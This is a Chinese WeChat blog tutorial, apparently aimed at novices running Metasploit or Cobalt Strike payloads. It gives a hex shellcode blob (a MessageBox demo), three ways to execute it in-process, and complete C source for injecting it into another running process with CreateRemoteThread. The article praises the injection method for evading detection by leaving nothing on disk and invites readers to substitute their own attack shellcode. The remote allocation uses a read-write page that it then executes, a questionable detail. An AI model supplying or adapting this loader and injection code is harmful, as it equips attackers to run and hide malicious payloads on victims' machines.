> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/qeT1n_n2TpXynrAQH-XviA)

前言：shellcode 是一段用于利用软件漏洞而执行的代码，shellcode 为 16 进制的机器码，因为经常让攻击者获得 shell 而得名。shellcode 常常使用机器语言编写。可在暂存器 eip 溢出后，塞入一段可让 CPU 执行的 shellcode 机器码，让电脑可以执行攻击者的任意指令。

今天讲一下 shellcode 的调用及内存注入的一个案例。

想必好多新手在玩 MSF,CS 能生成 shellcode 的马子，但是 shellcode 生成后.... 不会调用，所以来讲一下 shellcode 的调用。

1.  调用 Shellcode  
    
    因为便于演示，下面的这段 shellcode 是一个 MessageBox 弹框  
    

```
unsigned char  shellcode[]=
  "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
     "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
     "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
     "\x49\x0C\x8B\x09\x8B\x09\x8B\x69\x18\xAD\x3D\x6A\x0A\x38\x1E\x75"
     "\x05\x95\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD"
     "\x8B\x59\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE"
     "\x06\x3A\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24"
     "\x1C\x75\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03"
     "\xDD\x03\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9"
     "\x33\xDB\x53\x68\x74\x20\x00\x00\x68\x69\x6b\x61\x73\x68\x53\x61"
     "\x6e\x64\x8B\xC4\x53\x50\x50\x53\xFF\x57\xFC\x8B\xE6\xC3";
```

    第一种调用：通过 VirtualAlloc 申请一块内存空间，VirtualAlloc 如果调用成功, 返回分配的首地址, 否则为 NULL。然后进行 memcpy 将 Shellcode 复制到 VirtualAlloc 申请的内存中，进行调用！这里说一句废话，如果 VirtualAlloc 申请失败返回 NULL 的情况下，通过 GetLastError() 进行获取错误信息！

这里顺手贴一下 VirtualAlloc 这个函数的用法

![](https://mmbiz.qpic.cn/mmbiz_png/8miblt1VEWywyKpNN6QoFZWEKEciby2PXrgtf0dyGW1GnXae1iaVrM0rFkeayLJTUlyzje1a3icuryXdibdYfhWgicfQ/640?wx_fmt=png)

```
unsigned char  shellcode[]=
  "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
     "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
     "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
     "\x49\x0C\x8B\x09\x8B\x09\x8B\x69\x18\xAD\x3D\x6A\x0A\x38\x1E\x75"
     "\x05\x95\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD"
     "\x8B\x59\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE"
     "\x06\x3A\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24"
     "\x1C\x75\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03"
     "\xDD\x03\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9"
     "\x33\xDB\x53\x68\x74\x20\x00\x00\x68\x69\x6b\x61\x73\x68\x53\x61"
     "\x6e\x64\x8B\xC4\x53\x50\x50\x53\xFF\x57\xFC\x8B\xE6\xC3";
//代码如下
 typedef void(*CODE)();  //定义一个函数指针
  LPVOID codes = NULL;//初始化一下codes
  codes  = VirtualAlloc(NULL,sizeof(shellcode),MEM_COMMIT,PAGE_EXECUTE_READWRITE);
  memcpy(codes,shellcode,sizeof(shellcode));//将shellcode内容复制到codes这块内存里面，第三参数是大小
  CODE c = (CODE)codes;
  c();//直接调用即可
```

如下图，成功调用

![](https://mmbiz.qpic.cn/mmbiz_png/8miblt1VEWywyKpNN6QoFZWEKEciby2PXreGQqtEAIwPHtsgKb6VAlibZJLRTXpxq9IuZ8prpAvdxEzziaCRRic1Axw/640?wx_fmt=png)

第二种调用：通过 malloc 也是可以哒

这里 malloc 申请了一块堆内存，然后将 shellcode Copy 到 temp 里即可。

和上面那种差不多~  

```
unsigned char  shellcode[]=
  "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
     "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
     "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
     "\x49\x0C\x8B\x09\x8B\x09\x8B\x69\x18\xAD\x3D\x6A\x0A\x38\x1E\x75"
     "\x05\x95\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD"
     "\x8B\x59\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE"
     "\x06\x3A\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24"
     "\x1C\x75\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03"
     "\xDD\x03\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9"
     "\x33\xDB\x53\x68\x74\x20\x00\x00\x68\x69\x6b\x61\x73\x68\x53\x61"
     "\x6e\x64\x8B\xC4\x53\x50\x50\x53\xFF\x57\xFC\x8B\xE6\xC3";
  
  typedef void(*CODE)();  
  int size = sizeof(shellcode);
  char* temp = (char*)malloc(size);
  memcpy(temp,shellcode,size);
  CODE c = (CODE)temp;
  c();
```

                                            如下图，调用成功  

![](https://mmbiz.qpic.cn/mmbiz_png/8miblt1VEWywyKpNN6QoFZWEKEciby2PXr7NK2ibpwic8dfjVyHwKYA6Brgthk9yEnqK3xJlGI0sDMxYoX0OPQbt5Q/640?wx_fmt=png)

第三种调用：  

    比较快捷简便，汇编调用。将 shellcode 的地址传给 eax 寄存器，然后直接 jmp 进行跳转过去。其实还有很多种调用方式... 只要你思路够多肯定就行。

```
__asm{
      lea eax,shellcode
      jmp eax
    }
```

![](https://mmbiz.qpic.cn/mmbiz_png/8miblt1VEWywyKpNN6QoFZWEKEciby2PXrDNgHpTNicUDSzySiaMtGewWWxZYlltWagY8LrNTibhAibBSyB7MbibhRIjA/640?wx_fmt=png)

简单介绍上面三种 shellcode 调用应该也够新手们用了！剩下的举一反三即可。  

2. 利用 Shellcode 注入到进程内存  

    Shellcode 注入到到进程内存发现的概率比较低，因为注入的 Shellcode 没有保存在磁盘文件。弊端：当目标应用程序关闭，或者系统重启机就凉凉，还有就是加载器被发现，也凉凉~  

OpenProcess(获取进程句柄)--->VirtualAllocEx(在目标进程申请一块内存)-->WriteProcessMemory 拷贝过去 -->CreateRemoteThread(在其它进程创建线程)

```
  第一个参数是进程权限//PROCESS_ALL_ACCESS所有能获得的权限， 
  第三个参数是进程ID 
  HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS,NULL,19524);
  
  VirtualAllocEx这个函数和VirtualAlloc差不多，可以看上面解释的图
  第一个参数是传入的进程句柄，第三个是大小，申请成功后，返回了p  
  LPVOID p = VirtualAllocEx(hprocess,NULL,sizeof(shellcode)+1,MEM_RESERVE | MEM_COMMIT,PAGE_READWRITE);
  
  第一个参数是进程句柄，然后将shellcode拷贝到申请的内存空间里面
  BOOL writes = WriteProcessMemory(hprocess,p,shellcode,sizeof(shellcode)+1,NULL);
  
  在进程里创建了一个线程，并直接调用了

  HANDLE h1 = CreateRemoteThread(hprocess,NULL,0,(LPTHREAD_START_ROUTINE)p,0,0,NULL);
```

接下来的话，以 fei 鸽模拟为受害程序

![](https://mmbiz.qpic.cn/mmbiz_png/8miblt1VEWywyKpNN6QoFZWEKEciby2PXrRWj96sdico1WoHdl7C6CvTC64Oicic4Yava4c0ykJacribFH2xQQDSgKIQ/640?wx_fmt=png)

如上图，成功将 Shellcode 注入到内存... 全部代码如下  

```
#include "stdafx.h"
#include <windows.h>
#include <stdlib.h>

unsigned char  shellcode[]=
  "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
     "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
     "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
     "\x49\x0C\x8B\x09\x8B\x09\x8B\x69\x18\xAD\x3D\x6A\x0A\x38\x1E\x75"
     "\x05\x95\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD"
     "\x8B\x59\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE"
     "\x06\x3A\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24"
     "\x1C\x75\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03"
     "\xDD\x03\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9"
     "\x33\xDB\x53\x68\x74\x20\x00\x00\x68\x69\x6b\x61\x73\x68\x53\x61"
     "\x6e\x64\x8B\xC4\x53\x50\x50\x53\xFF\x57\xFC\x8B\xE6\xC3";
void LoadDll(){
  HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS,NULL,19524);
    LPVOID p = VirtualAllocEx(hprocess,NULL,sizeof(shellcode)+1,MEM_RESERVE | MEM_COMMIT,PAGE_READWRITE);
  BOOL writes = WriteProcessMemory(hprocess,p,shellcode,sizeof(shellcode)+1,NULL);
  HANDLE h1 = CreateRemoteThread(hprocess,NULL,0,(LPTHREAD_START_ROUTINE)p,0,0,NULL);
}
int main(int argc, char* argv[])
{
  LoadDll();
  getchar();
  return 0;
}
```

结尾：我本文中为了演示方便，使用的是弹窗，私下自己测试将 shellcode 换成你自己生成的 Shellcode 即可                           

                          微信关注公众号：安全族 、连接世界的暗影

![](https://mmbiz.qpic.cn/mmbiz_jpg/8miblt1VEWywyKpNN6QoFZWEKEciby2PXrCyd95j2OY9OT9TZo6y8ictNIb6x77iahSia23sYGB7sXD1ibntic1Ryo8wA/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/PrTu58FA79bYUuGICO85hGrTyicvB3nMAtd7QY3C0H3CA2SOwaiaSkDbazCO8C1VXHx8ticGRxDeVATd9LZf62z4w/640?wx_fmt=jpeg)